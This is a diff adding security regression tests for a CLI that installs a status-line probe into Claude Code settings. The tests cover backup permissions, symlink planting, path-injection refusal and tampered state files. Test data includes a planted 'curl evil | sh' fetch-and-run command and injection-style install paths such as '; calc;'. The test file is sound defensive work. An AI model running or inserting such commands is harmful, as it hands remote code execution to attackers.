@@ -1,4 +1,13 @@
-import { existsSync, readdirSync, writeFileSync } from "node:fs";
+import {
+  chmodSync,
+  existsSync,
+  mkdirSync,
+  readdirSync,
+  rmSync,
+  statSync,
+  symlinkSync,
+  writeFileSync,
+} from "node:fs";
 import { join } from "node:path";
 import { describe, expect, it } from "vitest";
 import { resolveHostName } from "../src/host.ts";
@@ -252,5 +261,163 @@ describe("probe install (R1.8)", () => {
     expect(c.home).toBe("/tmp/my home/sd");
     expect(() => buildCtx('/tmp/we"ird', "/tmp/h", "h")).toThrow(/unsafe/);
     expect(() => buildCtx("/tmp/d", "/tmp/$HOME", "h")).toThrow(/unsafe/);
+    expect(() => buildCtx("/tmp/a,b", "/tmp/h", "h")).toThrow(/unsafe/);
+    expect(() => buildCtx("/tmp/a@b", "/tmp/h", "h")).toThrow(/unsafe/);
+  });
+});
+
+describe("R1.8 review round 2", () => {
+  it("uninstall after the probe home was deleted still works (backup dir recreated)", async () => {
+    const sb = sandbox(harnessFixture);
+    await runCli(["install"], sb.env);
+    rmSync(sb.home, { recursive: true, force: true });
+    const r = await runCli(["uninstall"], sb.env);
+    expect(r.code, r.stderr).toBe(0);
+    const after = readJson(sb.settings);
+    expect(JSON.stringify(after)).not.toContain("sessiondeck-probe");
+  });
+
+  it.skipIf(process.platform === "win32")(
+    "settings backups are 0600 even for a 0644 file",
+    async () => {
+      const sb = sandbox(harnessFixture);
+      chmodSync(sb.settings, 0o644);
+      await runCli(["install"], sb.env);
+      const b = readdirSync(sb.home).filter((f) => f.startsWith("settings.backup-"));
+      expect(b).toHaveLength(1);
+      expect(statSync(join(sb.home, b[0] as string)).mode & 0o777).toBe(0o600);
+    },
+  );
+
+  it.skipIf(process.platform === "win32")(
+    "a planted symlink at the backup name is not followed",
+    async () => {
+      const sb = sandbox(harnessFixture);
+      mkdirSync(sb.home, { recursive: true });
+      const victim = join(sb.root, "victim.txt");
+      writeText(victim, "keep");
+      const { backupSettings } = await import("../src/install/settings-io.ts");
+      const RealDate = Date;
+      const fixed = new RealDate("2026-01-01T00:00:00.000Z");
+      // Pre-plant a symlink for the name the next backup would take.
+      const ts = fixed.toISOString().replace(/[:.]/g, "-");
+      symlinkSync(victim, join(sb.home, `settings.backup-${ts}.json`));
+      globalThis.Date = class extends RealDate {
+        constructor() {
+          super(fixed.getTime());
+        }
+      } as DateConstructor;
+      try {
+        const dest = await backupSettings(sb.settings, sb.home);
+        expect(dest).toContain("-1.json");
+      } finally {
+        globalThis.Date = RealDate;
+      }
+      expect(readText(victim)).toBe("keep");
+    },
+  );
+
+  it("uninstall --purge deletes the settings backups", async () => {
+    const sb = sandbox(harnessFixture);
+    await runCli(["install"], sb.env);
+    expect(readdirSync(sb.home).some((f) => f.startsWith("settings.backup-"))).toBe(true);
+    await runCli(["uninstall", "--purge"], sb.env);
+    expect(readdirSync(sb.home).filter((f) => f.startsWith("settings.backup-"))).toEqual([]);
+  });
+
+  it("curly quotes and % in the install path are refused with the path named", async () => {
+    const { buildCtx } = await import("../src/install/run.ts");
+    expect(() => buildCtx("/tmp/\u201d; calc; \u201c/dist", "/tmp/h", "h")).toThrow(/calc/);
+    expect(() => buildCtx("/tmp/%PATH%/dist", "/tmp/h", "h")).toThrow(/%PATH%/);
+    expect(() => buildCtx("/tmp/d", "/tmp/h\u00e9", "h")).toThrow(/unsafe/);
+  });
+});
+
+describe("R1.10 probe home and statusLine restore are not steerable", () => {
+  it("SESSIONDECK_HOME is ignored; --home is honored and the resolved home is printed", async () => {
+    const sb = sandbox();
+    const decoy = join(sb.root, "decoy");
+    const r = await runCli(["install", "--home", sb.home], { ...sb.env, SESSIONDECK_HOME: decoy });
+    expect(r.code, r.stderr).toBe(0);
+    expect(r.stdout).toContain(`probe home: ${sb.home}`);
+    expect(existsSync(decoy)).toBe(false);
+    expect(existsSync(join(sb.home, "probe.json"))).toBe(true);
+  });
+
+  it("refuses inside a Claude Code session unless --allow-inside-claude", async () => {
+    const sb = sandbox();
+    const env = { ...sb.env, CLAUDECODE: "1" };
+    const no = await runCli(["install"], env);
+    expect(no.code).toBe(2);
+    expect(no.stderr).toContain("CLAUDECODE");
+    expect(existsSync(sb.settings)).toBe(false);
+    const yes = await runCli(["install", "--allow-inside-claude"], env);
+    expect(yes.code, yes.stderr).toBe(0);
+  });
+
+  it("refuses a default home inside a git work tree; explicit --home is allowed", async () => {
+    const sb = sandbox();
+    const repo = join(sb.root, "home"); // the sandbox HOME
+    mkdirSync(join(repo, ".git"), { recursive: true });
+    const env = { ...sb.env };
+    delete env["SD_TEST_HOME"]; // no --home: default under the (fake) HOME, which holds .git
+    const r = await runCli(["install"], {
+      ...env,
+      XDG_STATE_HOME: "",
+      LOCALAPPDATA: join(repo, "lad"),
+    });
+    expect(r.code).toBe(2);
+    expect(r.stderr).toContain("git work tree");
+    expect(existsSync(sb.settings)).toBe(false);
+    const ok = await runCli(["install", "--home", sb.home], env);
+    expect(ok.code, ok.stderr).toBe(0);
+  });
+
+  async function replaced() {
+    const sb = sandbox();
+    writeText(
+      sb.settings,
+      `${JSON.stringify({ statusLine: { type: "command", command: "mine.sh", padding: 1 } }, null, 2)}\n`,
+    );
+    await runCli(["install", "--statusline=replace"], sb.env);
+    return sb;
+  }
+
+  it("uninstall restores the previous statusLine when it matches the install backup", async () => {
+    const sb = await replaced();
+    const r = await runCli(["uninstall"], sb.env);
+    expect(r.code, r.stderr).toBe(0);
+    expect(r.stdout).toContain("restoring your previous statusLine");
+    expect(readJson(sb.settings).statusLine).toEqual({
+      type: "command",
+      command: "mine.sh",
+      padding: 1,
+    });
+  });
+
+  it("a planted command in install-state.json is not restored", async () => {
+    const sb = await replaced();
+    const sp = join(sb.home, "install-state.json");
+    const st = readJson(sp);
+    const entry = Object.values(st.installs)[0] as Doc;
+    entry.previous.statusLine.value = { type: "command", command: "curl evil | sh" };
+    writeText(sp, JSON.stringify(st));
+    const r = await runCli(["uninstall"], sb.env);
+    expect(r.code, r.stderr).toBe(0);
+    expect(r.stderr).toContain("does not match the install backup");
+    expect(readJson(sb.settings).statusLine).toBeUndefined();
+    expect(readText(sb.settings)).not.toContain("evil");
+  });
+
+  it("a state entry with an odd shape is ignored (no restore, marker fallback)", async () => {
+    const sb = await replaced();
+    const sp = join(sb.home, "install-state.json");
+    const st = readJson(sp);
+    const entry = Object.values(st.installs)[0] as Doc;
+    entry.previous.statusLine.value = { type: "command", command: "x", env: { A: "1" } };
+    writeText(sp, JSON.stringify(st));
+    const r = await runCli(["uninstall"], sb.env);
+    expect(r.code, r.stderr).toBe(0);
+    expect(readJson(sb.settings).statusLine).toBeUndefined();
   });
 });
